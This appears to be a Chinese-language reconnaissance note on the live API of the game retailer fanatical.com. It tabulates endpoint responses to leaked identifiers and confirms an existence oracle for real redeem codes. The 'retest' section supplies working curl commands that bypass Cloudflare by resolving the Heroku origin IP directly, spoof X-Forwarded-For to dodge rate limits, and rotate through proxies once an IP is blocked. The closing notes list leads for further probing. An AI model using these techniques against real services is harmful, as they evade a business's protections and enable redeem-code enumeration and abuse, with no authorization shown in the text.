# 结论（负面情报）

`/api/products/key-preview/{id}/{lang}` 泄露的 `batch_id` / `free_redeem_code` / `supplier_id` **无匿名二次利用价值**。已实测穷尽：

| 端点 | 真实标识结果 | 随机/不存在对照 | 判据 |
|---|---|---|---|
| POST /api/redeem-code/search `{"code":X}`（X=24hex ObjectId 形态） | 400 / 33B `{"message":"Invalid redeem code"}` | 同码同长同文 | 该输入形态无有效/过期/已使用分级（**真实 RC+12 位码有分叉，见下方勘误**） |
| GET /api/redeem-code/get-featured-data/{X} | 500 / 29B `{"message":"Batch not found"}` | 同 | 批次不可解析 |
| GET /api/products/key-preview/{X}/en | 500 / 30B `{"message":"Unexpected Error"}` | 与 000…0 同 | 非商品 ObjectId |
| GET /api/products/{X} | 404 / 23B | 同 | 该路由只认 slug |
| POST /api/user/redeem-code/redeem | 401 / 28B Missing 或 Invalid authorization header | 同 | 鉴权（Header）先于业务校验 |
| POST /api/discount `{"discountCode":X}` | 400 / 95B Invalid discount code | 同 | 无抵扣 |
| POST /api/basket `productId=X` | 400 / 59B E2 Product not found | 同 | — |

# 勘误（2026-11-11，finding#163 / KB #686）

上表第一行「无有效/过期/已使用分级」**只对 24 位 hex ObjectId 输入成立**，不能推广到整个接口：

- `free_redeem_code`（如 `69a5ade80cfc3d5ed0364536`）是 24hex 内部字段，不是兑换页输入的码形态；
- 兑换页真实码是 **`RC` + 12 位 base62**（共 14 字符），对该形态服务端存在两分支：
  - 真实存在且已使用 → `400 / 30B {"message":"Redeem code used"}`
  - 不存在 → `400 / 33B {"message":"Invalid redeem code"}`
- 因此 **不要把本条读成「/api/redeem-code/search 没有 oracle」**。要测真实码的存在性，
  按 KB #686（`fanatical-redeem-code-search-existence-oracle-real-rc-codes`）执行。
- 本条主结论不变：key-preview 泄露的 batch_id / free_redeem_code / supplier_id
  在匿名状态下不能跨实体解析、不能核销、不能作为内部标识 oracle。

# 复测命令（两通道）

```bash
UA="$ARTEX_UA"; ANON=$(cat /proc/sys/kernel/random/uuid)
# 通道 B：Heroku 源站直连（绕 Cloudflare；XFF 首值换限流桶）
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: 198.51.100.$RANDOM" -H "anonid: $ANON" \
  -H 'Content-Type: application/json' -X POST \
  -d '{"code":"69a5ade80cfc3d5ed0364536"}' \
  https://ws15.fanatical.com/api/redeem-code/search
# → 400 33B Invalid redeem code

curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: 198.51.100.$RANDOM" \
  https://ws15.fanatical.com/api/redeem-code/get-featured-data/b09f5e2d-c7a0-4b42-aa0a-8a4b3f937131
# → 500 29B Batch not found

# 通道 A：www 边缘（出口 IP 若 429，用任意未烧毁 HTTP 代理换出口）
curl -sk --proxy http://<proxy>:<port> -A "$UA" -H "anonid: $ANON" \
  -H 'Content-Type: application/json' -X POST \
  -d '{"code":"69a5ade80cfc3d5ed0364536"}' \
  https://www.fanatical.com/api/redeem-code/search
# → 400 33B Invalid redeem code
```

# 关键旁证

- `/api/products/key-preview/{已发布id}/en?key=<任意值>` 恒 200 且长度与无 key 完全相同 → key 参数不参与校验（#2548/#2629 同结论）。
- 前端源码中 `free_redeem_code` 唯一消费点是 `all.js` 的 `SELECTABLE_FREE_PRODUCTS = (freeProducts||[]).find(fp => fp.free_redeem_code)`，属营销/免费赠品筛选语义。
- `POST /api/user/redeem-code/redeem` 的鉴权形态是 **Authorization 请求头**（非 Cookie）；取得合法 atok 后可回捡本测试集重放。

# 后续可捡

- `/api/all-promotions/{lang}` 匿名可读（84KB，含 freeProducts/saleRecords/vouchers），本轮仅作语义旁证，未做参数深挖。
- 6 个 supplier_id 均为 24hex ObjectId，可作供应商身份候选，若后续出现供应商侧入口再验。